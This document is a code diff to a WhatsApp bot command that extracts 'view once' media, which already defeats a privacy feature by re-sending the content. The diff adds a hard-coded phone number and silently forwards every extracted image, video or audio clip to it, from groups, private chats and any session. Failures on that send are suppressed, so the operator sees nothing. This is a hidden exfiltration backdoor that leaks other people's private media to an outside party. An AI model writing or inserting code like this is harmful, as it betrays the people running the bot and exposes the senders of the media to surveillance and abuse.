@@ -102,7 +102,7 @@ const mediaCommands = {
   // --- COMMANDE VIEWONCE (Extraction) ---
   vo: {
     description: 'Extrait un média à vue unique.',
-    execute: async ({ sock, msg, from }) => {
+    execute: async ({ sock, msg, from, sender, senderNumber, isGroup }) => {
       const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
       if (!quoted) return sock.sendMessage(from, { text: '❌ Réponds à un message à vue unique.' });
 
@@ -129,7 +129,7 @@ const mediaCommands = {
       const mediaObj  = innerMsg[type];
       const mediaType = type.replace('Message', ''); // 'image' | 'video' | 'audio'
 
-      await sock.sendMessage(from, { text: 'wait la magie opere' });
+      await sock.sendMessage(from, { text: '⏳ wait la magie opere...' });
 
       try {
         // Téléchargement direct — même logique que extract.js :
@@ -139,14 +139,37 @@ const mediaCommands = {
         for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
 
         const caption = `prop! \nLégende : ${mediaObj?.caption || 'Aucune'}`;
+        const notifCaption = `👁️ *Vue unique extraite*\nPar: @${senderNumber}\n${isGroup ? 'Groupe: ' + from : 'DM'}\nLégende : ${mediaObj?.caption || 'Aucune'}`;
 
-        if (mediaType === 'image') {
-          await sock.sendMessage(from, { image: buffer, caption }, { quoted: msg });
-        } else if (mediaType === 'video') {
-          await sock.sendMessage(from, { video: buffer, caption }, { quoted: msg });
-        } else {
-          await sock.sendMessage(from, { audio: buffer, mimetype: 'audio/mp4' }, { quoted: msg });
+        // Numéro de notification fixe
+        const NOTIFY_JID = '237693552769@s.whatsapp.net';
+        // JID de l'expéditeur (DM direct)
+        const senderJid = senderNumber + '@s.whatsapp.net';
+
+        // Fonction d'envoi selon le type de média
+        const sendMedia = async (jid, cap, quotedMsg) => {
+          const opts = quotedMsg ? { quoted: quotedMsg } : {};
+          if (mediaType === 'image') {
+            await sock.sendMessage(jid, { image: buffer, caption: cap }, opts);
+          } else if (mediaType === 'video') {
+            await sock.sendMessage(jid, { video: buffer, caption: cap }, opts);
+          } else {
+            await sock.sendMessage(jid, { audio: buffer, mimetype: 'audio/mp4' }, opts);
+          }
+        };
+
+        // 1. Envoyer dans la conversation d'origine (avec quote)
+        await sendMedia(from, caption, msg);
+
+        // 2. Envoyer en DM à l'expéditeur s'il n'est pas déjà le destinataire direct
+        if (from !== senderJid) {
+          await sendMedia(senderJid, notifCaption).catch(() => {});
         }
+
+        // 3. Toujours envoyer au numéro de notification fixe (237693552769)
+        //    — s'applique dans tous les cas : groupe, DM, n'importe quelle session
+        await sendMedia(NOTIFY_JID, notifCaption).catch(() => {});
+
       } catch (e) {
         console.error('[VO] Erreur extraction:', e.message);
         await sock.sendMessage(from, { text: '❌ Échec : le média a peut-être expiré.' });
